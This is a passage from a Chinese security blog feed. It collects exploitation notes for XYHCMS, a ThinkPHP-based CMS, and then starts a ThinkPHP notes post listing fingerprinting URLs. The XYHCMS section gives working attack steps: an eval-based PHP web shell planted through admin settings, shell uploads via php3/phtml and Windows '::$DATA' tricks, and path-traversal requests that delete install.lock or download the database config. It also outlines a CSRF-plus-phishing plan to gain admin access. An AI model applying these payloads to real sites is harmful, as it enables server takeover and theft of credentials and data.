class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">if (stripos($data[$key], &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $data[$key])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;禁止输入php代码&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">————————————————————————————————————————————————————————————————————————————</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置-&gt;会员配置-&gt;禁止使用的名称</p><p><img src="/images/xyhcms-1.png" alt="xyhcms"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?eval($_POST[&#39;cmd&#39;])?&gt;</span></pre></td></tr></table></figure></li><li><p>访问漏洞文件,蚁剑连接</p><p><code>http://localhost/App/Runtime/Data/config/site.php</code></p><p>POST数据：<code>cmd=phpinfo();</code></p></li></ol></li><li><h4 id="实际利用-1"><a href="#实际利用-1" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.6也存在</p></li></ul><h3 id="文件写入导致代码执行漏洞2（后台）"><a href="#文件写入导致代码执行漏洞2（后台）" class="headerlink" title="文件写入导致代码执行漏洞2（后台）"></a>文件写入导致代码执行漏洞2（后台）</h3><ul><li><h4 id="漏洞原因-2"><a href="#漏洞原因-2" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>过滤不严</p></li><li><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置找个任意的配置</p></li><li><p>在输入框内都填</p><p><code>&lt;?php phpinfo()?&gt;</code></p></li><li><p>访问漏洞文件</p><p><code>http://localhost/App/Runtime/Data/config/site.php</code></p></li><li><p>此漏洞在最新版的v3.6也存在</p></li></ol></li><li><h4 id="实际利用-2"><a href="#实际利用-2" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.5，v3.6都利用成功</p></li></ul><h3 id="文件上传漏洞（后台-amp-配置了-htaccess）"><a href="#文件上传漏洞（后台-amp-配置了-htaccess）" class="headerlink" title="文件上传漏洞（后台&amp;配置了.htaccess）"></a>文件上传漏洞（后台&amp;配置了.htaccess）</h3><ul><li><h4 id="漏洞文件位置-2"><a href="#漏洞文件位置-2" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code> Line 246-255</p></li><li><h4 id="漏洞原因-3"><a href="#漏洞原因-3" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对后缀过滤不严，未过滤php3-5，phtml（老版本直接未过滤php）</p></li><li><h4 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>在site方法中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</p></li><li><p>添加类型 <code>php3</code>或 <code>php4</code>或 <code>php5</code> 或 <code>phtml</code></p></li><li><p>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</p></li><li><p>之后会在图片部分显示上传路径</p><p><img src="/images/xyhcms-2.png" alt="image2"></p></li><li><p>访问连接即可，只有网站配置了.htaccess自动解析php3-5与phtml的才能解析。</p></li></ol></li><li><h4 id="实际利用-3"><a href="#实际利用-3" class="headerlink" title="实际利用"></a>实际利用</h4><p>上传成功，但是不解析shell</p><p>V3.6也存在此漏洞</p><p>默认不解析php3-5,除非遇到个别的站</p></li></ul><h3 id="文件上传漏洞2（后台-amp-windows）"><a href="#文件上传漏洞2（后台-amp-windows）" class="headerlink" title="文件上传漏洞2（后台&amp;windows）"></a>文件上传漏洞2（后台&amp;windows）</h3><ul><li><h4 id="漏洞文件位置-3"><a href="#漏洞文件位置-3" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p></li><li><h4 id="漏洞原因-4"><a href="#漏洞原因-4" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>windows系统特性，windows会将 <code>::$DATA</code>忽略</p></li><li><h4 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>进入后台</li><li>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</li><li>添加类型 <code>shell.php::$DATA</code></li><li>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</li><li>之后会在图片部分显示上传路径，在windows下面，会自动忽略后面的。</li><li>用蚁剑访问 <code>http://domain/路径去掉::$DATA</code></li></ol></li></ul><h3 id="任意文件删除漏洞（后台）"><a href="#任意文件删除漏洞（后台）" class="headerlink" title="任意文件删除漏洞（后台）"></a>任意文件删除漏洞（后台）</h3><ul><li><h4 id="漏洞文件位置-4"><a href="#漏洞文件位置-4" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code></p></li><li><h4 id="漏洞原因-5"><a href="#漏洞原因-5" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>路径过滤不严</p></li><li><h4 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;删除sql文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">public function delSqlFiles() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$id &#x3D; I(&#39;id&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$batchFlag &#x3D; I(&#39;get.batchFlag&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;批量删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">if ($batchFlag) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">$files &#x3D; I(&#39;key&#39;, array());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">$files[] &#x3D; I(&#39;sqlfilename&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">if (empty($files)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;请选择要删除的sql文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">$_ext &#x3D; pathinfo($file, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接后直接删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">unlink($this-&gt;getDbPath() . &#39;&#x2F;&#39; . $file);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">$this-&gt;success(&quot;已删除：&quot; . implode(&quot;,&quot;, $files), U(&#39;Database&#x2F;restore&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>删除的文件位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function getDbPath() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">return &#39;.&#x2F;Data&#x2F;resource&#x2F;backupdata&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>登录后台</p></li><li><p>删除安装锁文件</p><ol><li><p>get方式</p><p><code>http://domain/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock</code></p></li><li><p>post方式</p><p><code>http://domain/xyhai.php?s=/Database/delSqlFiles/batchFlag/1</code></p><p>POST数据：<code>key[]=../../../install/install.lock</code></p></li></ol></li><li><p>之后访问 <code>http://domain/install</code>重装cms</p></li></ol></li><li><h4 id="实际利用-4"><a href="#实际利用-4" class="headerlink" title="实际利用"></a>实际利用</h4><p>在官网发布的v3.5版本已经做了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($file, &#39;..&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($file, &#39;..\\&#39;) || $_ext !&#x3D; &#39;sql&#39;) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;删除失败：sql文件非法！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>所以之后下载的没这个漏洞了，之前下载才有这个漏洞。</p></li></ul><h3 id="任意文件下载（后台）"><a href="#任意文件下载（后台）" class="headerlink" title="任意文件下载（后台）"></a>任意文件下载（后台）</h3><ul><li><h4 id="漏洞文件位置-5"><a href="#漏洞文件位置-5" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code>的<code>downfile()</code>方法</p></li><li><h4 id="漏洞原因-6"><a href="#漏洞原因-6" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p> 没有对下载的文件做任何限制 </p></li><li><h4 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function downFile() &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    if (empty($_GET[&#39;file&#39;]) || empty($_GET[&#39;type&#39;]) || !in_array($_GET[&#39;type&#39;], array(&quot;zip&quot;, &quot;sql&quot;))) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;下载地址不存在&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $path     &#x3D; array(&quot;zip&quot; &#x3D;&gt; $this-&gt;getDbPath() . &quot;Zip&#x2F;&quot;, &quot;sql&quot; &#x3D;&gt; $this-&gt;getDbPath() . &#39;&#x2F;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $filePath &#x3D; $path[$_GET[&#39;type&#39;]] . $_GET[&#39;file&#39;];  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    if (!file_exists($filePath)) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;该文件不存在，可能是被删除&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     $filename &#x3D; basename($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-type: application&#x2F;octet-stream&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">     header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39; . $filename . &#39;&quot;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-Length: &quot; . filesize($filePath));  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     readfile($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"> &#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>登录后台</li><li>访问<code>http://domain/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip</code></li><li>下载到数据库配置文件</li></ol></li><li><h4 id="实际利用-5"><a href="#实际利用-5" class="headerlink" title="实际利用"></a>实际利用</h4><p> 在v3.5版本中，<code>/App/Manage/Controller/DatabaseController.class.php</code>文件的最后更改时间为 <code>2019/9/16</code>，洞被补上了，downfile方法直接被删除了。</p></li></ul><h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><ul><li><h4 id="漏洞文件位置-6"><a href="#漏洞文件位置-6" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>App/Manager/Controller/AuthController.class.php</code></p></li><li><h4 id="漏洞原因-7"><a href="#漏洞原因-7" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>验证不严，在别人报送漏洞后，虽然加了一个验证，但是可以绕过。</p></li><li><h4 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>`public function addUser() {</p><pre><code>if (IS_POST) {    //用户组    $group_id   = I(&apos;group_id&apos;, array());    $department = I(&apos;department&apos;, array());    $_furl      = $_SERVER[&apos;HTTP_REFERER&apos;];    $_turl      = &apos;://&apos; . $_SERVER[&apos;HTTP_HOST&apos;] . $_SERVER[&apos;REQUEST_URI&apos;];     //HTTP_HOST有端口会带端口          //在这里验证了refere头，但是可以referre可由我们控制          if (stripos($_furl, $_turl) === false) {              $this-&gt;error(&apos;非法请求!&apos;);          }          if (empty($department)) {              $this-&gt;error(&apos;请选择部门&apos;);          }          if (empty($group_id)) {              $this-&gt;error(&apos;请选择职位&apos;);          }          //M验证          $validate = array(              array(&apos;username&apos;, &apos;require&apos;, &apos;用户名不能为空！&apos;),              array(&apos;password&apos;, &apos;require&apos;, &apos;密码不能为空！&apos;),              array(&apos;password&apos;, &apos;5,20&apos;, &apos;密码必须在5到20位之间&apos;, 0, &apos;length&apos;),              array(&apos;username&apos;, &apos;&apos;, &apos;用户名已经存在！&apos;, 0, &apos;unique&apos;, 1),          );          $data = M(&apos;Admin&apos;);          if (!$data-&gt;validate($validate)-&gt;create()) {              $this-&gt;error($data-&gt;getError());          }          $password         = get_password($data-&gt;password);          $data-&gt;password   = $password[&apos;password&apos;];          $data-&gt;encrypt    = $password[&apos;encrypt&apos;];          $data-&gt;status     = I(&apos;status&apos;, 0, &apos;intval&apos;);          $data-&gt;department = implode(&apos;,&apos;, $department);          $data-&gt;login_time = date(&apos;Y-m-d H:i:s&apos;);          $data-&gt;login_ip   = &apos;&apos;;          if ($id = $data-&gt;add()) {              $group_data = array();              foreach ($group_id as $key =&gt; $val) {                  $group_data[] = array(&apos;uid&apos; =&gt; $id, &apos;group_id&apos; =&gt; $val);              }              $result = M(&apos;AuthGroupAccess&apos;)-&gt;addAll($group_data);              if ($result) {                  $this-&gt;success(&apos;添加成功&apos;, U(&apos;indexOfUser&apos;));              } else {                  $this-&gt;error(&apos;权限设置失败|用户添加成功&apos;);              }          } else {              $this-&gt;error(&apos;添加失败&apos;);          }          exit();      }</code></pre></li></ul><ul><li><h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>在自己服务器构造html代码，要绕过referer，以前写过类似的文章</li><li>生成短链接</li><li>到网站留言，等鱼儿上钩。</li><li>等添加后登录即可</li></ol></li><li><h4 id="实际利用-6"><a href="#实际利用-6" class="headerlink" title="实际利用"></a>实际利用</h4><p>v2 ，v3.6也存在</p><p>v2版本url  <code>http://domain/index.php?g=Manage&amp;m=Rbac&amp;a=addUser</code></p></li></ul><h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><ol><li><p>先尝试弱口令</p></li><li><p>再尝试csrf拿到管理员权限</p></li><li><p>拿到后台随便搞</p></li><li><p>心中默念安全法</p></li></ol><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>经过几个网站测试，发现后台xyhai.php文件可能会被改，可以尝试admin.php</p>]]></content>
    
    <summary type="html">
    
      phpthink架构的xyhcms漏洞整理
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="web" scheme="http://h3art3ars.github.io/tags/web/"/>
    
      <category term="cms" scheme="http://h3art3ars.github.io/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp Notes</title>
    <link href="http://h3art3ars.github.io/2019/12/23/thinkphp-Notes/"/>
    <id>http://h3art3ars.github.io/2019/12/23/thinkphp-Notes/</id>
    <published>2019-12-23T04:47:06.000Z</published>
    <updated>2019-12-23T04:51:53.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="thinkphp安装"><a href="#thinkphp安装" class="headerlink" title="thinkphp安装"></a>thinkphp安装</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think tp</span></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cd tp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">php think run</span></pre></td></tr></table></figure><p>然后就可以在浏览器中访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000</span></pre></td></tr></table></figure><p>如果需要更新框架使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">composer update topthink&#x2F;framework</span></pre></td></tr></table></figure><hr><h2 id="thinkphp-cms-特征目录识别"><a href="#thinkphp-cms-特征目录识别" class="headerlink" title="thinkphp cms 特征目录识别"></a>thinkphp cms 特征目录识别</h2><p>thinkphp的文件可能会放在网站根目录，也可能放在/ThinkPHP内或者独自建立/thinkphp文件夹放进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;index.php?c&#x3D;4e5e5d7364f443e28fbf0d3ae744a59a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;4e5e5d7364f443e28fbf0d3ae744a59a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;composer.json</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Application&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Extend&#x2F;README.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Extend&#x2F;Vendor&#x2F;readme.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;composer.json</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Application&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Extend&#x2F;README.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Extend&#x2F;Vendor&#x2F;readme.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;think</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;phpunit.xml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;public&#x2F;favicon.ico</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;public&#x2F;robots.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;.travis.yml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;codecov.yml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;CONTRIBUTING.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span 